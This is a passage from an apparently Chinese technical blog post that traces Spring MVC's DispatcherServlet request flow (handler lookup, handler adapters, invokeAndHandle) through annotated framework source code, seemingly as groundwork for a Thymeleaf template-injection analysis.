doDispatch 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doDispatch</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">processedRequest</span> <span class="hljs-operator">=</span> request;<br>    <span class="hljs-type">HandlerExecutionChain</span> <span class="hljs-variable">mappedHandler</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>    <span class="hljs-type">boolean</span> <span class="hljs-variable">multipartRequestParsed</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-type">WebAsyncManager</span> <span class="hljs-variable">asyncManager</span> <span class="hljs-operator">=</span> WebAsyncUtils.getAsyncManager(request);<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">mv</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">Exception</span> <span class="hljs-variable">dispatchException</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 先检查是不是 Multipart 类型的，比如上传等；如果是 Multipart 类型的，则转换为 MultipartHttpServletRequest 类型</span><br>            processedRequest = checkMultipart(request);<br>            multipartRequestParsed = (processedRequest != request);<br><br>            <span class="hljs-comment">// 获取当前请求的 Handler 执行链</span><br>            mappedHandler = getHandler(processedRequest);<br>            <span class="hljs-keyword">if</span> (mappedHandler == <span class="hljs-literal">null</span>) &#123;<br>                noHandlerFound(processedRequest, response);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br><br>            <span class="hljs-comment">// 获取当前请求的 Handler 适配器</span><br>            <span class="hljs-type">HandlerAdapter</span> <span class="hljs-variable">ha</span> <span class="hljs-operator">=</span> getHandlerAdapter(mappedHandler.getHandler());<br><br>            <span class="hljs-comment">// 对于 header 中 last-modified 的处理</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> request.getMethod();<br>            <span class="hljs-type">boolean</span> <span class="hljs-variable">isGet</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;GET&quot;</span>.equals(method);<br>            <span class="hljs-keyword">if</span> (isGet || <span class="hljs-string">&quot;HEAD&quot;</span>.equals(method)) &#123;<br>                <span class="hljs-type">long</span> <span class="hljs-variable">lastModified</span> <span class="hljs-operator">=</span> ha.getLastModified(request, mappedHandler.getHandler());<br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletWebRequest</span>(request, response).checkNotModified(lastModified) &amp;&amp; isGet) &#123;<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-comment">// 遍历所有定义的 interceptor，执行 preHandle 方法</span><br>            <span class="hljs-keyword">if</span> (!mappedHandler.applyPreHandle(processedRequest, response)) &#123;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br><br>            <span class="hljs-comment">// 实际调用 Handler 的地方</span><br>            mv = ha.handle(processedRequest, response, mappedHandler.getHandler());<br><br>            <span class="hljs-keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>            <span class="hljs-comment">// 处理成默认视图名，也就是添加前缀和后缀等</span><br>            applyDefaultViewName(processedRequest, mv);<br>            <span class="hljs-comment">// 拦截器postHandle方法进行处理</span><br>            mappedHandler.applyPostHandle(processedRequest, response, mv);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>            dispatchException = ex;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> (Throwable err) &#123;<br>            dispatchException = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NestedServletException</span>(<span class="hljs-string">&quot;Handler dispatch failed&quot;</span>, err);<br>        &#125;<br>        <span class="hljs-comment">// 处理最后的结果，渲染之类的都在这里</span><br>        processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);<br>    &#125;<br>    <span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>        triggerAfterCompletion(processedRequest, response, mappedHandler, ex);<br>    &#125;<br>    <span class="hljs-keyword">catch</span> (Throwable err) &#123;<br>        triggerAfterCompletion(processedRequest, response, mappedHandler,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">NestedServletException</span>(<span class="hljs-string">&quot;Handler processing failed&quot;</span>, err));<br>    &#125;<br>    <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-keyword">if</span> (asyncManager.isConcurrentHandlingStarted()) &#123;<br>            <span class="hljs-keyword">if</span> (mappedHandler != <span class="hljs-literal">null</span>) &#123;<br>                mappedHandler.applyAfterConcurrentHandlingStarted(processedRequest, response);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (multipartRequestParsed) &#123;<br>                cleanupMultipart(processedRequest);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="查找对应的-Handler-对象"><a href="#查找对应的-Handler-对象" class="headerlink" title="查找对应的 Handler 对象"></a>查找对应的 Handler 对象</h4><p><img src="/img/ssti(java)/ssti36.png"></p><p>可以看到468行调用了getHandler方法，跟进一下</p><p>该方法主要是遍历所有的 handlerMappings 进行处理，handlerMappings 是在启动的时候预先注册好的，handlerMappings 包含 RequestMappingHandlerMapping、BeanNameUrlHandlerMapping、RouterFunctionMapping、SimpleUrlHandlerMapping 以及 WelcomePageHandlerMapping，在循环中会调用 <strong>AbstractHandlerMapping 类中的 getHandler 方法</strong>来获取 Handler 执行链，若获取的 Handler 执行链不为 null，则返回当前请求的 Handler 执行链，DispatcherServlet 类的 getHandler 方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> HandlerExecutionChain <span class="hljs-title function_">getHandler</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.handlerMappings != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// 遍历所有的 handlerMappings 进行处理，handlerMappings 是在启动的时候预先注册好的</span><br>        <span class="hljs-keyword">for</span> (HandlerMapping mapping : <span class="hljs-built_in">this</span>.handlerMappings) &#123;<br>            <span class="hljs-type">HandlerExecutionChain</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> mapping.getHandler(request);<br>            <span class="hljs-keyword">if</span> (handler != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> handler;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>在循环中，根据 <code>mapping.getHandler(request);</code>，继续往下看 <strong>AbstractHandlerMapping 类中的 getHandler 方法</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> HandlerExecutionChain <span class="hljs-title function_">getHandler</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">// 根据 request 获取 handler</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> getHandlerInternal(request);<br>    <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// 如果没有找到就使用默认的 handler</span><br>        handler = getDefaultHandler();<br>    &#125;<br>    <span class="hljs-keyword">if</span> (handler == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-comment">// 如果 Handler 是 String，表明是一个 bean 名称，需要寻找对应 bean</span><br>    <span class="hljs-keyword">if</span> (handler <span class="hljs-keyword">instanceof</span> String) &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">handlerName</span> <span class="hljs-operator">=</span> (String) handler;<br>        handler = obtainApplicationContext().getBean(handlerName);<br>    &#125;<br>    <span class="hljs-comment">// 封装 Handler 执行链</span><br>    <span class="hljs-keyword">return</span> getHandlerExecutionChain(handler, request);<br>&#125;<br></code></pre></td></tr></table></figure><p>AbstractHandlerMapping 类中的 getHandler 方法中首先<strong>根据 request 获取 handler</strong>，看到调用了新的<strong>getHandlerInternal</strong> 方法</p><p><img src="/img/ssti(java)/ssti37.png"></p><p>跟进一下AbstractHandlerMethodMapping 类中的 <strong>getHandlerInternal</strong> 方法，看到该方法首先获取 request 中的 url，即 <code>/path</code>，用来匹配 handler 并封装成 HandlerMethod，然后根据 handlerMethod 中的 bean 来实例化 Handler 并返回。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> HandlerMethod <span class="hljs-title function_">getHandlerInternal</span><span class="hljs-params">(HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">// 获取 request 中的 url，用来匹配 handler</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">lookupPath</span> <span class="hljs-operator">=</span> getUrlPathHelper().getLookupPathForRequest(request);<br>    request.setAttribute(LOOKUP_PATH, lookupPath);<br>    <span class="hljs-built_in">this</span>.mappingRegistry.acquireReadLock();<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// 根据路径寻找 Handler，并封装成 HandlerMethod</span><br>        <span class="hljs-type">HandlerMethod</span> <span class="hljs-variable">handlerMethod</span> <span class="hljs-operator">=</span> lookupHandlerMethod(lookupPath, request);<br>        <span class="hljs-comment">// 根据 handlerMethod 中的 bean 来实例化 Handler，并添加进 HandlerMethod</span><br>        <span class="hljs-keyword">return</span> (handlerMethod != <span class="hljs-literal">null</span> ? handlerMethod.createWithResolvedBean() : <span class="hljs-literal">null</span>);<br>    &#125;<br>    <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-built_in">this</span>.mappingRegistry.releaseReadLock();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到从request中获取了&#x2F;path</p><p><img src="/img/ssti(java)/ssti38.png"></p><p>接下来，我们看 <strong>lookupHandlerMethod</strong> 的逻辑，主要逻辑委托给了 <strong>mappingRegistry</strong> 这个成员变量来处理：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> HandlerMethod <span class="hljs-title function_">lookupHandlerMethod</span><span class="hljs-params">(String lookupPath, HttpServletRequest request)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    List&lt;Match&gt; matches = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>    <span class="hljs-comment">// 通过 lookupPath 属性中查找。如果找到了，就返回对应的RequestMappingInfo</span><br>    List&lt;T&gt; directPathMatches = <span class="hljs-built_in">this</span>.mappingRegistry.getMappingsByUrl(lookupPath);<br>    <span class="hljs-keyword">if</span> (directPathMatches != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// 如果匹配到了，检查其他属性是否符合要求，如请求方法，参数，header 等</span><br>        addMatchingMappings(directPathMatches, matches, request);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (matches.isEmpty()) &#123;<br>        <span class="hljs-comment">// 没有直接匹配到，则遍历所有的处理方法进行通配符匹配</span><br>        addMatchingMappings(<span class="hljs-built_in">this</span>.mappingRegistry.getMappings().keySet(), matches, request);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!matches.isEmpty()) &#123;<br>        <span class="hljs-comment">// 如果方法有多个匹配，不同的通配符等，则排序选择出最合适的一个</span><br>        Comparator&lt;Match&gt; comparator = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MatchComparator</span>(getMappingComparator(request));<br>        matches.sort(comparator);<br>        <span class="hljs-type">Match</span> <span class="hljs-variable">bestMatch</span> <span class="hljs-operator">=</span> matches.get(<span class="hljs-number">0</span>);<br>        <span class="hljs-comment">// 如果有多个匹配的，会找到第二个最合适的进行比较</span><br>        <span class="hljs-keyword">if</span> (matches.size() &gt; <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-keyword">if</span> (logger.isTraceEnabled()) &#123;<br>                logger.trace(matches.size() + <span class="hljs-string">&quot; matching mappings: &quot;</span> + matches);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (CorsUtils.isPreFlightRequest(request)) &#123;<br>                <span class="hljs-keyword">return</span> PREFLIGHT_AMBIGUOUS_MATCH;<br>            &#125;<br>            <span class="hljs-type">Match</span> <span class="hljs-variable">secondBestMatch</span> <span class="hljs-operator">=</span> matches.get(<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">if</span> (comparator.compare(bestMatch, secondBestMatch) == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-type">Method</span> <span class="hljs-variable">m1</span> <span class="hljs-operator">=</span> bestMatch.handlerMethod.getMethod();<br>                <span class="hljs-type">Method</span> <span class="hljs-variable">m2</span> <span class="hljs-operator">=</span> secondBestMatch.handlerMethod.getMethod();<br>                <span class="hljs-type">String</span> <span class="hljs-variable">uri</span> <span class="hljs-operator">=</span> request.getRequestURI();<br>                <span class="hljs-comment">// 不能有相同的最优 Match</span><br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalStateException</span>(<br>                        <span class="hljs-string">&quot;Ambiguous handler methods mapped for &#x27;&quot;</span> + uri + <span class="hljs-string">&quot;&#x27;: &#123;&quot;</span> + m1 + <span class="hljs-string">&quot;, &quot;</span> + m2 + <span class="hljs-string">&quot;&#125;&quot;</span>);<br>            &#125;<br>        &#125;<br>        request.setAttribute(BEST_MATCHING_HANDLER_ATTRIBUTE, bestMatch.handlerMethod);<br>        <span class="hljs-comment">// 设置 request 参数（RequestMappingHandlerMapping 对其进行了覆写）</span><br>        handleMatch(bestMatch.mapping, lookupPath, request);<br>        <span class="hljs-comment">// 返回匹配的 url 的处理的方法</span><br>        <span class="hljs-keyword">return</span> bestMatch.handlerMethod;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 调用 RequestMappingHandlerMapping 类的 handleNoMatch 方法再匹配一次</span><br>        <span class="hljs-keyword">return</span> handleNoMatch(<span class="hljs-built_in">this</span>.mappingRegistry.getMappings().keySet(), lookupPath, request);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>之后通过createWithResolvedBean()方法，根据 handlerMethod 中的 bean 来实例化 Handler(找到对应控制器)</p><p>通过上面的过程，我们就获取到了 Handler。</p><p>看到动态调试时回到AbstractHandlerMapping 类中的 getHandler 方法继续执行，调用了getHandlerExecutionChain方法</p><p><img src="/img/ssti(java)/ssti39.png"></p><p>该方法是用于<strong>封装执行链</strong>，将配置的拦截器加入到执行链中去，<strong>getHandlerExecutionChain</strong> 方法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> HandlerExecutionChain <span class="hljs-title function_">getHandlerExecutionChain</span><span class="hljs-params">(Object handler, HttpServletRequest request)</span> &#123;<br>    <span class="hljs-comment">// 如果当前 Handler 不是执行链类型，就使用一个新的执行链实例封装起来</span><br>    <span class="hljs-type">HandlerExecutionChain</span> <span class="hljs-variable">chain</span> <span class="hljs-operator">=</span> (handler <span class="hljs-keyword">instanceof</span> HandlerExecutionChain ? (HandlerExecutionChain) handler : <span class="hljs-keyword">new</span> <span class="hljs-title class_">HandlerExecutionChain</span>(handler));<br><br>    <span class="hljs-type">String</span> <span class="hljs-variable">lookupPath</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.urlPathHelper.getLookupPathForRequest(request, LOOKUP_PATH);<br>    <span class="hljs-comment">// 遍历拦截器，找到跟当前 url 对应的，添加进执行链中去</span><br>    <span class="hljs-keyword">for</span> (HandlerInterceptor interceptor : <span class="hljs-built_in">this</span>.adaptedInterceptors) &#123;<br>        <span class="hljs-keyword">if</span> (interceptor <span class="hljs-keyword">instanceof</span> MappedInterceptor) &#123;<br>            <span class="hljs-type">MappedInterceptor</span> <span class="hljs-variable">mappedInterceptor</span> <span class="hljs-operator">=</span> (MappedInterceptor) interceptor;<br>            <span class="hljs-keyword">if</span> (mappedInterceptor.matches(lookupPath, <span class="hljs-built_in">this</span>.pathMatcher)) &#123;<br>                chain.addInterceptor(mappedInterceptor.getInterceptor());<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            chain.addInterceptor(interceptor);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> chain;<br>&#125;<br></code></pre></td></tr></table></figure><p>到此为止，我们就获取了当前请求的 Handler 执行链，接下来看下是如何获取请求的 <strong>Handler 适配器</strong>，主要依靠 <strong>DispatcherServlet 类的 getHandlerAdapter 方法</strong>，该方法就是遍历所有的 HandlerAdapter，找到和当前 Handler 匹配的就返回，在这里匹配到的为 RequestMappingHandlerAdapter。DispatcherServlet 类的 getHandlerAdapter 方法如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> HandlerAdapter <span class="hljs-title function_">getHandlerAdapter</span><span class="hljs-params">(Object handler)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.handlerAdapters != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-comment">// 遍历所有的 HandlerAdapter，找到和当前 Handler 匹配的就返回</span><br>        <span class="hljs-keyword">for</span> (HandlerAdapter adapter : <span class="hljs-built_in">this</span>.handlerAdapters) &#123;<br>            <span class="hljs-keyword">if</span> (adapter.supports(handler)) &#123;<br>                <span class="hljs-keyword">return</span> adapter;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServletException</span>(<span class="hljs-string">&quot;No adapter for handler [&quot;</span> + handler +<br>            <span class="hljs-string">&quot;]: The DispatcherServlet configuration needs to include a HandlerAdapter that supports this handler&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="HandlerAdapter-执行当前的-Handler"><a href="#HandlerAdapter-执行当前的-Handler" class="headerlink" title="HandlerAdapter 执行当前的 Handler"></a>HandlerAdapter 执行当前的 Handler</h4><p>再获取完当前请求的 Handler 适配器后，接着进行<strong>缓存处理</strong>，也就是对 last-modified 的处理，然后调用 applyPreHandle 方法<strong>执行拦截器的 preHandle 方法</strong>，即遍历所有定义的 interceptor，执行 postHandle 方法，然后就到了实际执行 handle 的地方，doDispatch 方法中 handle 方法是执行当前 Handler，我们这里使用的是 RequestMappingHandlerAdapter，首先会进入 <strong>AbstractHandlerMethodAdapter 的 handle 方法</strong>：</p><p>实现执行 Controller 中 (Handler) 的方法,返回 ModelAndView 视图</p><p><img src="/img/ssti(java)/ssti40.png"></p><p>在 AbstractHandlerMethodAdapter 的 handle 方法中又调用了 <strong>RequestMappingHandlerAdapter 类的 handleInternal 方法</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> ModelAndView <span class="hljs-title function_">handleInternal</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, HandlerMethod handlerMethod)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    ModelAndView mav;<br>    checkRequest(request);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.synchronizeOnSession) &#123;<br>        <span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> request.getSession(<span class="hljs-literal">false</span>);<br>        <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">mutex</span> <span class="hljs-operator">=</span> WebUtils.getSessionMutex(session);<br>            <span class="hljs-keyword">synchronized</span> (mutex) &#123;<br>                mav = invokeHandlerMethod(request, response, handlerMethod);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            mav = invokeHandlerMethod(request, response, handlerMethod);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 执行方法，封装 ModelAndView</span><br>        mav = invokeHandlerMethod(request, response, handlerMethod);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (!response.containsHeader(HEADER_CACHE_CONTROL)) &#123;<br>        <span class="hljs-keyword">if</span> (getSessionAttributesHandler(handlerMethod).hasSessionAttributes()) &#123;<br>            applyCacheSeconds(response, <span class="hljs-built_in">this</span>.cacheSecondsForSessionAttributeHandlers);<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            prepareResponse(response);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> mav;<br>&#125;<br></code></pre></td></tr></table></figure><p>在执行完 handle 方法后，然后调用 applyDefaultViewName 方法<strong>组装默认视图名称</strong>，将前缀和后缀名都加上，接着调用 applyPostHandle 方法<strong>执行拦截器的 preHandle 方法</strong>，也就是遍历所有定义的 interceptor，执行 postHandle 方法</p><h4 id="封装ModelAndView对象"><a href="#封装ModelAndView对象" class="headerlink" title="封装ModelAndView对象"></a>封装ModelAndView对象</h4><p><code>invokeHandlerMethod()</code> 方法先执行目标的 <code>HandlerMethod</code>，并返回一个 <code>ModelAndView</code> 对象。比较重要的方法在第 512 行，此处的 handlerMethod 其实是 <code>com.abc.ssti.controller.ThymeleafController#path(String)</code>，这一个方法，通过 <code>this.createInvocableHandlerMethod()</code> 方法，将其封装成 <code>ServletInvocableHandlerMethod</code> 类，并让其具有 invoke 执行能力。</p><p><img src="/img/ssti(java)/ssti41.png"></p><p>后续，给 <code>invocableMethod</code> 的各大属性赋值，在赋值完毕后 new 了一个 <code>ModelAndViewContainer</code> 对象，后续会将所有的值保存到这一个对象中。</p><p><img src="/img/ssti(java)/ssti42.png"></p><p>往下走，先调用 <code>AsyncWebRequest</code> 进行异步请求的包装，后续针对是否是异步请求，做不同的处理。继续往下走，到 524行的地方是关键点，它调用了 <code>ServletInvocableHandlerMethod.invokeAndHandle()</code> 方法，调用这个方法的作用主要是获取到了 returnValueHandlers，跟进看一下。</p><p><img src="/img/ssti(java)/ssti43.png"></p><p>在<code>ServletInvocableHandlerMethod#invokeAndHandle</code>中，做了如下操作：</p><ul><li><code>invokeForRequest</code>调用Controller后获取返回值到<code>returnValue</code>中</li><li>判断<code>returnValue</code>是否为空，如果是则继续判断<code>0RequestHandled</code>是否为<code>True</code>，都满足的话设置<code>requestHandled</code>为<code>true</code></li><li>通过<code>handleReturnValue</code>根据返回值的类型和返回值将不同的属性设置到<code>ModelAndViewContainer</code>中。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invokeAndHandle</span><span class="hljs-params">(ServletWebRequest webRequest, ModelAndViewContainer mavContainer, Object... providedArgs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//调用Controller后获取返回值到returnValue中</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">returnValue</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.invokeForRequest(webRequest, mavContainer, providedArgs);<br>        <span class="hljs-built_in">this</span>.setResponseStatus(webRequest);<br>        <span class="hljs-comment">//判断returnValue是否为空</span><br>        <span class="hljs-keyword">if</span> (returnValue == <span class="hljs-literal">null</span>) &#123;<br>            <span 